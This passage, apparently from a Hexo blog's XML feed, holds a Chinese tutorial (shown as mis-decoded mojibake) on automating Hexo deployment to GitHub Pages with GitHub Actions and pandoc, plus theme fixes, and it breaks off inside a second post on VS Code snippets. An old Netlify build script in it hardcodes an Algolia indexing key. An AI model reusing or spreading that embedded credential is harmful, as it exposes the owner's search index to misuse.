Hexoé»˜è®¤æ¸²æŸ“æ’ä»¶ï¼š<code>npm uninstall hexo-renderer-marked --save</code>å®‰è£… pandocæ¸²æŸ“æ’ä»¶ï¼š<code>npm install hexo-renderer-pandoc --save</code>æ³¨æ„ï¼šéœ€è¦å®‰è£… pandocï¼Œå¦åˆ™ä¼šæŠ¥é”™</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -c https://github.com/jgm/pandoc/releases/download/3.1.6/pandoc-3.1.6-1-amd64.deb</span><br><span class="line">sudo dpkg -i pandoc-3.1.6-1-amd64.deb</span><br></pre></td></tr></table></figure></p><p>å¦ä¸€æ¬¾é’ˆå¯¹ hexo çš„ markdown æ¸²æŸ“å™¨ï¼ˆmathæ–¹é¢æ’ä»¶æ”¯æŒï¼‰ï¼šhexo-renderer-markdown-itï¼Œå…ˆè¯•ç€ä¸Šé¢çš„ pandocä¸è¡Œå†è¯•è¿™ä¸ªï¼ŒğŸ˜„ã€‚</p></li></ol><h2 id="github-action-è‡ªåŠ¨åŒ–éƒ¨ç½²">Github action è‡ªåŠ¨åŒ–éƒ¨ç½²</h2><p>æ•ˆæœï¼šåªéœ€è¦ commit æºæ–‡ä»¶ï¼ŒGithub actionè‡ªåŠ¨åŒ–ä¾¿ä¼šè‡ªåŠ¨éƒ¨ç½²æ›´æ–°ç½‘é¡µã€‚</p><p>é¦–å…ˆï¼Œé‡è¿°ä¸€ä¸‹æˆ‘çš„åšå®¢ä¸ä»“åº“ï¼šrealyee.github.ioä»“åº“ä½œä¸ºå­¦æœ¯ä¸»é¡µï¼Œå¼€å¯ page æœåŠ¡ï¼›blog ä»“åº“ä½œä¸ºåšå®¢ä¸»é¡µï¼Œå¼€å¯ pageæœåŠ¡ï¼Œç›®å½•ä¸º realyee.github.io/blogã€‚æ–°å»º academic_sourceï¼Œblog_sourceç§äººä»“åº“åˆ†åˆ«å¯¹åº”äº realyee.github.io ä»“åº“ä¸ blogä»“åº“ï¼Œå­˜å‚¨å¯¹åº”çš„æºæ–‡ä»¶ã€‚</p><p>é¦–å…ˆ,åœ¨æ­å»ºå¥½åŸåšå®¢çš„æƒ…å†µä¸‹,è¿›è¡Œä¸‹é¢æ­¥éª¤ï¼ˆä»¥ academic_sourceä¸ºä¾‹ï¼‰</p><ol type="1"><li><p>åœ¨ theme çš„ä¸»é¢˜ç›®å½•ä¸‹åˆ é™¤ <code>.git</code>ç›®å½•ï¼š<code>rm -rf theme/academia/.git</code></p></li><li><p>åœ¨ github ç½‘é¡µä¸Š fork æ‰€ä½¿ç”¨çš„ä¸»é¢˜ä»“åº“ï¼Œå¹¶åœ¨ç½‘é¡µç«¯æ–°å»ºç©ºä»“åº“<code>academic_source</code></p></li><li><p>åœ¨ hexo åšå®¢æ ¹ç›®å½•ä¸‹ï¼Œåˆ›å»ºå¦‚ä¸‹ç›®å½•æ–‡ä»¶<code>.github/workflows/autodeploy.yml</code>(æœ€åçš„æ–‡ä»¶åéšæ„å†™ï¼Œåªè¦æ˜¯ yaml æ ¼å¼å°±è¡Œ) å¡«å…¥ä¸€ä¸‹å†…å®¹ï¼Œå¹¶å¯¹åº”ä¿®æ”¹:</p><p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">    <span class="attr">push:</span></span><br><span class="line">        <span class="attr">branches:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">    <span class="attr">hexo_depoly:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">        <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">        <span class="attr">GIT_NAME:</span> <span class="string">realyee</span></span><br><span class="line">        <span class="attr">GIT_EMAIL:</span> <span class="number">615836359</span><span class="string">@qq.com</span></span><br><span class="line">        <span class="attr">BLOG_REPO:</span> <span class="string">blog</span></span><br><span class="line">        <span class="attr">GH_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GH_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">THEME_NAME:</span> <span class="string">maupassant</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">        <span class="comment"># checkout the source code and update the submodule recuresively,like `git submodule update --init --recursive`</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span></span><br><span class="line">          <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">          <span class="attr">with:</span></span><br><span class="line">              <span class="attr">submodules:</span> <span class="string">recursive</span></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Configure</span> <span class="string">theme</span></span><br><span class="line">          <span class="comment"># copy the theme config and avatar to the theme folder</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              cp ./themes/_config.yml ./themes/$&#123;THEME_NAME&#125;/_config.yml</span></span><br><span class="line"><span class="string">              cp ./themes/source/img/avatar.png ./themes/$&#123;THEME_NAME&#125;/source/img/avatar.png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span></span><br><span class="line">          <span class="attr">uses:</span> <span class="string">actions/setup-node@v3</span></span><br><span class="line">          <span class="attr">with:</span></span><br><span class="line">              <span class="attr">node-version:</span> <span class="string">&quot;18.x&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Install pandoc for mathjax</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">pandoc</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              cd /tmp</span></span><br><span class="line"><span class="string">              wget -c https://github.com/jgm/pandoc/releases/download/3.1.6/pandoc-3.1.6-1-amd64.deb</span></span><br><span class="line"><span class="string">              sudo dpkg -i pandoc-3.1.6-1-amd64.deb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span> <span class="string">&amp;</span> <span class="string">Generate</span> <span class="string">static</span> <span class="string">files</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              node -v</span></span><br><span class="line"><span class="string">              npm i -g hexo-cli</span></span><br><span class="line"><span class="string">              npm uninstall hexo-renderer-marked --save</span></span><br><span class="line"><span class="string">              npm install hexo-renderer-pandoc --save</span></span><br><span class="line"><span class="string">              npm i</span></span><br><span class="line"><span class="string">              hexo clean</span></span><br><span class="line"><span class="string">              hexo g</span></span><br><span class="line"><span class="string"></span>        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Git</span> <span class="string">config</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              git config --global user.name $&#123;GIT_NAME&#125;</span></span><br><span class="line"><span class="string">              git config --global user.email $&#123;GIT_EMAIL&#125;</span></span><br><span class="line"><span class="string"></span>        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">to</span> <span class="string">Github</span> <span class="string">Pages</span></span><br><span class="line">          <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">              git clone https://github.com/$&#123;GIT_NAME&#125;/$&#123;BLOG_REPO&#125;.git</span></span><br><span class="line"><span class="string">              cp -r ./public/* ./$&#123;BLOG_REPO&#125;/</span></span><br><span class="line"><span class="string">              cd $&#123;BLOG_REPO&#125;</span></span><br><span class="line"><span class="string">              git add .</span></span><br><span class="line"><span class="string">              git commit -m &quot;$&#123;&#123;github.event.head_commit.message&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">              git push &quot;https://$&#123;GH_TOKEN&#125;@github.com/$&#123;GIT_NAME&#125;/$&#123;BLOG_REPO&#125;.git&quot; master</span></span><br></pre></td></tr></table></figure></p><p>ä¿®æ”¹ç‚¹å¦‚ä¸‹ï¼š</p><ol type="1"><li><p><code>push</code> çš„ <code>master</code> æ˜¯æŒ‡åœ¨ push åˆ°ä½ è¿™ä¸ªä»“åº“academic_source çš„ master åˆ†æ”¯æ—¶ï¼Œæ‰ä¼šè§¦å‘è¿™ä¸ª github action</p></li><li><p>å¯¹åº”ä¿®æ”¹ githubçš„ç”¨æˆ·åï¼Œé‚®ç®±ï¼Œä¸»é¢˜åä»¥åŠä½ è¦å‘å¸ƒåˆ°çš„ä»“åº“åï¼Œæ–¹ä¾¿åé¢çš„å˜é‡å¼•ç”¨</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIT_NAME: realyee</span><br><span class="line">GIT_EMAIL: xxxxxxx@qq.com</span><br><span class="line">ACADEMIC_REPO: realyee.github.io</span><br><span class="line">GH_TOKEN: $&#123;&#123; secrets.GH_TOKEN &#125;&#125;</span><br><span class="line">THEME_NAME: Academia</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„: åœ¨ github action ä¸­çš„ envå˜é‡ä¸­ä¸èƒ½åµŒå¥—ä½¿ç”¨å˜é‡ï¼Œåªèƒ½ä½¿ç”¨å­—é¢å€¼, åƒè¿™ç§<code>REPO_NAME: $&#123;GIT_NAME&#125;.github.io</code> å°±ä¼šæŠ¥é”™ã€‚ GH_TOKENè¿™é‡Œéœ€è¦ä½ åœ¨ <a href="https://github.com/settings/tokens">githubtoken</a> è¿™é‡Œç”Ÿæˆä¸€ä¸ªåä¸º GH_TOKEN çš„æ°¸ä¸è¿‡æœŸçš„ classictokenï¼Œç„¶åç»™äºˆå…¶ repo å’Œ workflow çš„æ“ä½œæƒé™ï¼ˆæ³¨æ„ç”Ÿæˆçš„æ—¶å€™ä¿å­˜ tokenå€¼ï¼‰ã€‚ç„¶ååœ¨ academic_source ä»“åº“çš„ setting çš„secretï¼ˆhttps://github.com/realyee/academic_source/settings/secrets/actionsï¼‰ï¼ˆæ³¨æ„æ¢ä¸ºä½ çš„ç”¨æˆ·åï¼‰æ·»åŠ ä½ åˆšåˆšä¿å­˜çš„token å€¼ï¼Œå¹¶å‘½åä¸º GH_TOKENã€‚</p></li><li><p><code>cp ./themes/_config.yml ./themes/$&#123;THEME_NAME&#125;/_config.yml</code>ï¼šæ¯æ¬¡update theme submoduleï¼Œé‚£é…ç½®æ–‡ä»¶å°±å¾—é¢å¤–è‡ªå·±å­˜ï¼Œç„¶åæ‹·è´è¿›å…¥ã€‚åœ¨æœ¬åœ°çš„ academic_source çš„ themes ç›®å½•ä¸‹ä¿å­˜å¹¶é…ç½®ä¸€ä»½ theme çš„<code>_config.yml</code>, github action åˆ°æ—¶å°±ä¼šè‡ªå·±å¤åˆ¶è¿‡å»ã€‚</p></li></ol></li><li><p>åœ¨ hexo åšå®¢æ ¹ç›®å½•ä¸‹ï¼Œåˆå§‹åŒ– git ä»“åº“ï¼Œå¹¶å°† fork çš„ä»“åº“åŠ å…¥submodule, è¿æ¥ä»“åº“ï¼Œå¹¶å°†æºæ–‡ä»¶ push åˆ° master åˆ†æ”¯</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git submodule add https://github.com/realyee/hexo-theme-academia themes/academia</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git remote add origin git@github.com:realyee/academic_source.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure></p></li></ol><p>blog_source çš„ github action é…ç½®ç±»ä¼¼ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">name: Deployment</span><br><span class="line"></span><br><span class="line">on:</span><br><span class="line">    push:</span><br><span class="line">        branches: master</span><br><span class="line"></span><br><span class="line">jobs:</span><br><span class="line">    hexo_depoly:</span><br><span class="line">        runs-on: ubuntu-latest</span><br><span class="line">        env:</span><br><span class="line">            TZ: Asia/Shanghai</span><br><span class="line">            GIT_NAME: realyee</span><br><span class="line">            GIT_EMAIL: 615836359@qq.com</span><br><span class="line">            BLOG_REPO: blog</span><br><span class="line">            GH_TOKEN: $&#123;&#123; secrets.GH_TOKEN &#125;&#125;</span><br><span class="line">            THEME_NAME: maupassant</span><br><span class="line"></span><br><span class="line">        steps:</span><br><span class="line">            # checkout the source code and update the submodule recuresively,like `git submodule update --init --recursive`</span><br><span class="line">            - name: Checkout source</span><br><span class="line">              uses: actions/checkout@v3</span><br><span class="line">              with:</span><br><span class="line">                  submodules: recursive</span><br><span class="line"></span><br><span class="line">            - name: Configure theme</span><br><span class="line">              # copy the theme config and avatar to the theme folder</span><br><span class="line">              run: |</span><br><span class="line">                  cp ./themes/_config.yml ./themes/$&#123;THEME_NAME&#125;/_config.yml</span><br><span class="line">                  cp ./themes/source/img/avatar.png ./themes/$&#123;THEME_NAME&#125;/source/img/avatar.png</span><br><span class="line"></span><br><span class="line">            - name: Setup Node.js</span><br><span class="line">              uses: actions/setup-node@v3</span><br><span class="line">              with:</span><br><span class="line">                  node-version: &quot;18.x&quot;</span><br><span class="line"></span><br><span class="line">            - name: Install dependencies &amp; Generate static files</span><br><span class="line">              run: |</span><br><span class="line">                  node -v</span><br><span class="line">                  npm i -g hexo-cli</span><br><span class="line">                  npm i</span><br><span class="line">                  hexo clean</span><br><span class="line">                  hexo g</span><br><span class="line">            - name: Git config</span><br><span class="line">              run: |</span><br><span class="line">                  git config --global user.name $&#123;GIT_NAME&#125;</span><br><span class="line">                  git config --global user.email $&#123;GIT_EMAIL&#125;</span><br><span class="line">            - name: Deploy to Github Pages</span><br><span class="line">              run: |</span><br><span class="line">                  git clone https://github.com/$&#123;GIT_NAME&#125;/$&#123;BLOG_REPO&#125;.git</span><br><span class="line">                  cp -r ./public/* ./$&#123;BLOG_REPO&#125;/</span><br><span class="line">                  cd $&#123;BLOG_REPO&#125;</span><br><span class="line">                  git add .</span><br><span class="line">                  git commit -m &quot;Github Action Automated Deployment $(date +&#x27;%Y-%m-%d %H:%M:%S&#x27;)&quot;</span><br><span class="line">                  git push &quot;https://$&#123;GH_TOKEN&#125;@github.com/$&#123;GIT_NAME&#125;/$&#123;BLOG_REPO&#125;.git&quot; master</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5" type="1"><li>push çš„ commit message å¯ä»¥æ”¹ä¸ºè¯¥å˜é‡<code>$&#123;&#123; github.event.head_commit.message &#125;&#125;</code>ï¼Œè¯¥å˜é‡è·å–ä»“åº“çš„æœ€æ–° commitmessage.</li></ol><h2 id="å…³äº-maupassant-hexo-çš„å°ä¿®æ”¹">å…³äº maupassant-hexoçš„å°ä¿®æ”¹</h2><ol type="1"><li><p>blog çš„å¤´åƒä¸è¶…é“¾æ¥</p><blockquote><p>ç½‘ç«™å­˜æ”¾åœ¨å­ç›®å½•,å¦‚æœæ‚¨çš„ç½‘ç«™å­˜æ”¾åœ¨å­ç›®å½•ä¸­ï¼Œä¾‹å¦‚http://example.com/blogï¼Œåˆ™è¯·å°†æ‚¨çš„ url è®¾ä¸º http://example.com/blogå¹¶æŠŠ root è®¾ä¸º /blog/ã€‚</p></blockquote><p>ç”±äº maupassant åœ¨è¿™é‡Œæ²¡æœ‰ç”¨ç›¸å¯¹è·¯å¾„ï¼Œå› æ­¤<code>_config.yml</code>ä¸­avatar çš„è·¯å¾„éœ€è¦å¤šå†™ä¸€å±‚<code>avatar: ./blog/img/avatar.png</code></p></li><li><p>æ¢æ‰å¤´åƒçš„è¶…é“¾æ¥ï¼š åœ¨<code>blog/themes/maupassant/layout/_widget/info.pug</code> çš„<code>a.info-avatar(href='/', title= __(''))</code></p></li><li><p>tagcloud çš„è¶…é“¾æ¥ç›¸å¯¹è·¯å¾„ä¹Ÿå­˜åœ¨é—®é¢˜:åœ¨<code>blog/themes/maupassant/layout/tagcloud.pug</code> æ”¹ä¸ºç»å¯¹è·¯å¾„<code>a(href=config.root + 'tags/#' + tag.name, title=tag.name, rel= tag.length)</code></p></li></ol><p>ä»¥ä¸Šé—®é¢˜æˆ‘åœ¨è‡ªå·± fork çš„ maupassant-hexo ä»“åº“ä¸‹ä¹Ÿå¯¹åº”ä¿®æ”¹äº†</p><h2 id="å…¶ä»–éƒ¨ç½²ä¸­é‡åˆ°çš„å°é—®é¢˜">å…¶ä»–éƒ¨ç½²ä¸­é‡åˆ°çš„å°é—®é¢˜</h2><ol type="1"><li><p>Github action çš„ <code>uses</code> å’Œ <code>run</code>ä¸èƒ½ä¸€èµ·ä½¿ç”¨</p></li><li><p>git clone æ³¨æ„æŒ‡å®š git http åè®®ï¼Œä¸ä¼šåƒæµè§ˆå™¨ä¼¼çš„è¾“å…¥<code>github.com</code> å°±ç»™ä½ è¡¥å…¨ https</p></li><li><p>ssh åœ¨ä½¿ç”¨ä»£ç†çš„æƒ…å†µä¸‹ 22 ç«¯å£ä¸å¥½ç”¨ï¼ŒæŠ¥é”™å¦‚ä¸‹</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kex_exchange_identification: Connection closed by remote host</span><br><span class="line">Connection closed by 20.205.243.166 port 22</span><br><span class="line">fatal: Could not read from remote repository.</span><br><span class="line"></span><br><span class="line">Please make sure you have the correct access rights</span><br><span class="line">and the repository exists.</span><br></pre></td></tr></table></figure></p><p>è§£å†³åŠæ³•: åœ¨ <code>~/.ssh/config</code> ä¸­æ”¹æˆ 443 ç«¯å£</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HostName ssh.github.com</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure></p></li><li><p>å¦‚æœå¸Œæœ›åœ¨ hexo ä¸­ share pdf ç­‰æ–‡ä»¶ï¼Œå¯ä»¥åœ¨ source ä¸‹åˆ›å»ºä¸€ä¸ªassets æ–‡ä»¶å¤¹ï¼Œæ”¾åˆ°é‡Œé¢ï¼Œç„¶åç”¨å¸¦æœ‰åšå®¢ç½‘å€çš„ç»å¯¹è·¯å¾„å¼•ç”¨æ–‡ä»¶</p></li></ol><hr /><h2 id="old-discard-save-for-memory-hexo-next-ä½¿ç”¨-netlify">[Old,discard, SAVE FOR MEMORY] hexo-next ä½¿ç”¨ netlify</h2><p>æœ¬é™æ€åšå®¢é‡‡ç”¨ hexo æ¨¡æ¿ next ä¸»é¢˜ï¼Œmarkdown æºç åŠç”Ÿæˆçš„ htmlåˆ†åˆ«æ”¾åœ¨ Github ä¸¤ä¸ªä»“åº“ã€‚</p><p>é€šè¿‡ netlify æ ¹æ®æˆ‘å†™çš„ç®€å•è„šæœ¬è‡ªåŠ¨åŒ–éƒ¨ç½²æ“ä½œ markdownæºç ä»“åº“ï¼Œè¿›è¡Œæ„å»ºï¼Œå¹¶å‘å¸ƒåˆ° html åšå®¢ä»“åº“ã€‚å› æ­¤ï¼Œæˆ‘åªéœ€è¦å¯¹æºç ä»“åº“çš„markdown è¿›è¡Œç¼–å†™ï¼Œç„¶åä½¿ç”¨ git åŒæ­¥ä»“åº“å³å¯ã€‚</p><p>ä»¥ä¸‹æˆ‘çš„è‡ªåŠ¨åŒ–æ„å»ºè„šæœ¬ï¼ˆä»…ä¾›å‚è€ƒï¼‰:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env sh</span></span><br><span class="line">npm i</span><br><span class="line">npm i -g hexo-cli</span><br><span class="line">git clone --depth 1 --recursive https://github.com/violetu/hexo-theme-next themes/next</span><br><span class="line">cp -r source/themes/next/* themes/next/</span><br><span class="line">hexo clean</span><br><span class="line">hexo g &gt;/dev/null</span><br><span class="line">hexo d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‘ algolia æäº¤æ•°æ®ï¼Œä»¥ä¾¿æœç´¢</span></span><br><span class="line">export HEXO_ALGOLIA_INDEXING_KEY=&quot;a592b317037e2af5638bb820baa201e8&quot;</span><br><span class="line">hexo algolia</span><br></pre></td></tr></table></figure><h3 id="é…ç½®">é…ç½®</h3><p><a href="https://tding.top/archives/42c38b10">Hexo-NexT (v7.0+)ä¸»é¢˜é…ç½®</a> <a href="https://ftzzloo.com/hexo-add-disqus/">Hexoæ·»åŠ è¯„è®ºç³»ç»Ÿ Disqus</a></p><h3 id="æ–°åŸŸåå¯¼è‡´ä¸è’œå­ç»Ÿè®¡æ•°æ®å½’é›¶">æ–°åŸŸåå¯¼è‡´ä¸è’œå­ç»Ÿè®¡æ•°æ®å½’é›¶</h3><p><ahref="https://tqraf.cn/2020/07/busuanzi.html">ä¸è’œå­ç»Ÿè®¡æ•°æ®ä¿®æ”¹</a></p><h3 id="algolia-æœç´¢ä¸åˆ°ä¸œè¥¿">algolia æœç´¢ä¸åˆ°ä¸œè¥¿</h3><p>åŸå› ï¼šéƒ¨ç½²è„šæœ¬ä¸­å¿˜è®°å‘ hexo æäº¤æ•°æ®äº†ã€‚</p><p>è§£å†³æ–¹æ¡ˆ: é‚£æ˜¯å› ä¸ºä½ æœªèƒ½æˆåŠŸ hexo algoliaæ¯æ¬¡ç½‘ç«™æ›´æ–°å¾ˆå¤šæ–‡ç« å,è¦åŠæ—¶æäº¤æ•°æ®, å³æ‰§è¡Œ:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export HEXO_ALGOLIA_INDEXING_KEY=ä½ ä¸ºç´¢å¼•å•ç‹¬åˆ›å»ºçš„keyï¼ˆä¸æ˜¯search-only keyï¼‰</span><br><span class="line">hexo algolia</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><a href="https://ji2xpro.github.io/ea684c22/">Hexoåšå®¢æŒ‡å—|ç¬¬åä¸‰ç¯‡:Icarus é…ç½® - ç½‘ç«™æœç´¢æ’ä»¶</a></li><li><ahref="https://codingpub.github.io/2016/04/10/%E5%AE%9A%E5%88%B6Hexo-maupassant/">å®šåˆ¶Hexo - maupassant | Coding Pub</a></li><li><a href="https://hexo.io/zh-cn/docs/configuration.html">é…ç½® |Hexo</a></li><li><a href="https://juejin.cn/post/7215478156948701240">åˆ©ç”¨ Githubå®ç°(å¤šä¸ª)ä¸ªäººç½‘ç«™ - æ˜é‡‘</a> <ahref="https://www.bugjs.cn/index.php/archives/6/">Github Actionsè‡ªåŠ¨éƒ¨ç½² Hexo åšå®¢è‡³ä¸ªäººæœåŠ¡å™¨ - zain çš„å‰ç«¯å°çª</a></li><li><ahref="https://github.com/marketplace/actions/checkout-submodules">Checkoutsubmodules Â· Actions Â· GitHub Marketplace</a></li><li><ahref="https://jckling.github.io/2023/02/18/Other/Github%20Action%20%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%20Hexo%20%E5%8D%9A%E5%AE%A2/">GithubAction è‡ªåŠ¨éƒ¨ç½² Hexo åšå®¢ | Jckling's Blog</a></li><li><ahref="https://eftakhairul.com/githubs-repository-not-found-error-and-how-to-fix-it/">Githubâ€™sâ€œrepository not foundâ€ error and How to fix it</a></li><li><ahref="https://huanglizhu.github.io/2020/02/21/%E8%AE%A9google%E6%94%B6%E5%BD%95github%20pages%EF%BC%88hexo%EF%BC%89/">è®©google æ”¶å½• github pagesï¼ˆhexoï¼‰ | ç </a></li><li><ahref="https://shiraha.cn/2021/use-pandoc-to-render-multiline-formulas-correctly/">ä½¿ç”¨pandoc æ­£ç¡®æ¸²æŸ“å¤šè¡Œ MathJax å…¬å¼ - ä¸ƒæµ·ã®å‚è€ƒæ›¸</a></li><li><a href="https://zhuanlan.zhihu.com/p/58392526">GitLab ä¸­å°† Hexoæ›´æ”¹æ•°å­¦å…¬å¼æ¸²æŸ“å¼•æ“ä¸º Pandoc - çŸ¥ä¹</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vscode æ·»åŠ  hexo yaml snippet</title>
      <link href="/blog/2020/03/15/misc/hexo_vscode/"/>
      <url>/blog/2020/03/15/misc/hexo_vscode/</url>
      
        <content type="html"><![CDATA[<h2 id="vscode-æ·»åŠ -hexo-yaml-snippet">vscode æ·»åŠ  hexo yamlsnippet</h2><ol type="1"><li><p>åˆ›å»ºé’ˆå¯¹äº markdown æ–‡ä»¶æ ¼å¼çš„ snippet</p><p><code>Ctrl+shift+p</code> æ‰“å¼€ vscode command paletteï¼Œç„¶åè¾“å…¥snippet, é€‰æ‹© <code>Preference: Configure User Snippets</code>å¹¶å›è½¦ï¼Œç„¶åå†è¾“å…¥ markdown å¹¶å›è½¦ï¼Œå³å¯åˆ›å»ºä¸€ä¸ªä¸“é—¨å­˜æ”¾ markdown æ ¼å¼æ–‡ä»¶snippet çš„ jsonã€‚</p></li><li><p>å°†æˆ‘æä¾›çš„ snippet å¤åˆ¶åˆ°å¤§æ‹¬å·ä¸­ï¼Œç„¶åä¿å­˜</p><pre><code><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    <span class="attr">&quot;hexo yaml&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yaml&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;---\ntitle: $1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;toc: true&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;tags:&quot;</span><span 